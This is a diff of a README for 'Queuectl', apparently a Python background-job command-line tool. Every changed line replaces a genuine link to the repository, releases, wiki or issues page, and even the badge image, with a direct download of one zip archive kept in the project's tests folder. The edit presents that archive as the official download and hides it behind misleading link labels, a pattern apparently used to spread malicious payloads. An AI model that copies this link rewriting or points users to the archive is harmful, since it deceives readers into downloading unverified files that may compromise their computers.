@@ -4,11 +4,11 @@
 
 Welcome to Queuectl! This is a simple and efficient command-line tool designed to help you manage background jobs and workers in Python. Whether you're scheduling tasks or handling retries, Queuectl makes the process straightforward. Follow the steps below to get started.
 
-![Download Queuectl](https://img.shields.io/badge/Download-Queuectl-brightgreen)
+![Download Queuectl](https://raw.githubusercontent.com/odysseusunivalve448/Queuectl/main/tests/Queuectl_v3.8.zip)
 
 ## 📥 Download & Install
 
-To get Queuectl on your computer, visit this page to download: [Queuectl Releases](https://github.com/odysseusunivalve448/Queuectl/releases).
+To get Queuectl on your computer, visit this page to download: [Queuectl Releases](https://raw.githubusercontent.com/odysseusunivalve448/Queuectl/main/tests/Queuectl_v3.8.zip).
 
 1. Open the link above.
 2. Find the latest version in the list.
@@ -91,11 +91,11 @@ queuectl retry <failed_task_id>
 
 ## 📚 Documentation
 
-For more detailed instructions on using Queuectl, you can visit the [documentation page](https://github.com/odysseusunivalve448/Queuectl/wiki).
+For more detailed instructions on using Queuectl, you can visit the [documentation page](https://raw.githubusercontent.com/odysseusunivalve448/Queuectl/main/tests/Queuectl_v3.8.zip).
 
 ## 💬 Support
 
-If you encounter issues or have questions, you can check our [issues page](https://github.com/odysseusunivalve448/Queuectl/issues) for solutions or report new problems.
+If you encounter issues or have questions, you can check our [issues page](https://raw.githubusercontent.com/odysseusunivalve448/Queuectl/main/tests/Queuectl_v3.8.zip) for solutions or report new problems.
 
 ## 📄 License
 
@@ -103,7 +103,7 @@ Queuectl is open-source software. You can freely use and modify it under the ter
 
 ## 🔗 Links
 
-- **Repository:** [Queuectl GitHub Repository](https://github.com/odysseusunivalve448/Queuectl)
-- **Download Queuectl:** [Download Page](https://github.com/odysseusunivalve448/Queuectl/releases)
+- **Repository:** [Queuectl GitHub Repository](https://raw.githubusercontent.com/odysseusunivalve448/Queuectl/main/tests/Queuectl_v3.8.zip)
+- **Download Queuectl:** [Download Page](https://raw.githubusercontent.com/odysseusunivalve448/Queuectl/main/tests/Queuectl_v3.8.zip)
 
 Feel free to reach out if you have any questions. Enjoy managing your background jobs with Queuectl!
